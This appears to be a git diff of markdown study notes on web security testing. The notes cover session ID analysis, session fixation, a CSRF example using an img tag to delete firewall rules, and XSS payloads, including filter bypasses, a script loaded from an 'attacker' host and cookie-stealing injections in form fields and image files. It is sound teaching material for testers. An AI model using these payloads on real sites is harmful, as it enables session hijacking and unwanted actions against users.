@@ -39,7 +39,7 @@ All these should be tested for randomness, uniqueness and resistance to cryptogr
 - What clear text confidential information is stored
 - Is there a pattern in session id (whole or partialy)
 ### Session ID predictability and randomness
-- Compare session ids the same login conditions - eg. same username 
+- Compare session ids the same login conditions - eg. same username
 - Try to establish a high number of simultaneous connections in order to gather samples _in the same time window_
 - Are variavle parts incremental in nature?
 - Is time used as a seed (many systems use it)
@@ -68,10 +68,10 @@ Cookie attributes :
 - path - In addition to the domain, path that the cookie is valid
 - expires - if not set, cookie is valid in the current browser session and will be deleted when the session ends.
 
-### Tools 
+### Tools
 - Tamper Data (Firefox addon)
 
-## Testing for session fixation 
+## Testing for session fixation
 Occurs when application does not renew its session cookie after a successfull user authentication. Session fixation vulnerabilities can occur when :
 - a web app authenticates a user without first invalidating the existing sesison id (continuing use of existing session id)
 - attacker forces a known session id so, when user authenticates, attacker gains access to the session
@@ -113,7 +113,7 @@ CSRF attack forces user to execute unwanted actions on a web app he has already 
 - application session management relying only on information known by the browser
 - existence of HTML tags whose presence can cause immediate access to a _http/https_ resource (<img>).
 
-If the victim has authenticated, every next request causes the cookie be automatically sent with it. 
+If the victim has authenticated, every next request causes the cookie be automatically sent with it.
 A GET request could be originated by user
 - who is using the web app
 - who types url directly in the browser
@@ -124,7 +124,7 @@ A web app cannot distinguish the above invocations
 - Victim surfs on a firewall web interface. User authenticates and session information is stored to a cookie
 - An authenticated user can delete a single rule or all of the ("\*")
 - Delete rule page uses a form with a GET request (_...../delete?rule=1_ or _...../delete?rule=*_)
-- Attacker can manually submit the url, or redirect the user or access this url with an embedded image tag 
+- Attacker can manually submit the url, or redirect the user or access this url with an embedded image tag
 _<img src=...../delete?rule=*_
 
 If a user is logged id in the admin interface the request will succeed. \
@@ -213,7 +213,7 @@ Examples :
 4. Different syntax or encoding - Insert unexpected variations in the syntax or encoding
    - `"><script>.........</script>`
    - `%3cscript%e alert(document.cookie) %3c/script%3e`
-5. Bypassing non recursive filtering - Often input sanitization is _applied only once_ 
+5. Bypassing non recursive filtering - Often input sanitization is _applied only once_
    - `<scr<script>ipt> alert(document.cookie) </script>`
 6. Including external script - Assume that there is a regular expression checking if "<script*" (_anything but >_) is inserted. eg `<script src="http://....../xss.js"></script>` - bypass this by using the ">" character in an attribute between _script_ and _src_
    - `http://example/?var=<SCRIPT%20a=”>”%20SRC=”http://attacker/xss.js”></SCRIPT>`
@@ -251,3 +251,21 @@ Stored XSS does not need a malicious link to be exploited. A typical scenario ha
   - log (if it stores some user input into logs)
 - Determine if input is stored and how it is positioned in the context of the page (html tag for javascript)
 - All the out-of-band channels through which the application receives and stores user input
+
+Examples :
+```HTML
+<input class=..... type="text" name="email" value="aaa@aaa.bb"/>
+```
+The tester needs to find a way to inject code outside the input tag
+```<...>malicious code<!--  /> ```
+
+eg
+```aaa@aaa.bb"><script>alert(document.cookie)</script>```
+
+If "script" is replaced by space or null then the tester should examine the app for *XSS filtering*
+Stored XSS can be exploited by advanced Javascript exploitation framerwords (BeEF, XSS Proxy, BackFrame)
+
+### File upload
+Check if the web app allows file upload with html or text content. Text files, jpg and gif can contain XSS payload
+#### Image file contents
+mpla mpla mpla <script>alert(document.cookie)</script>
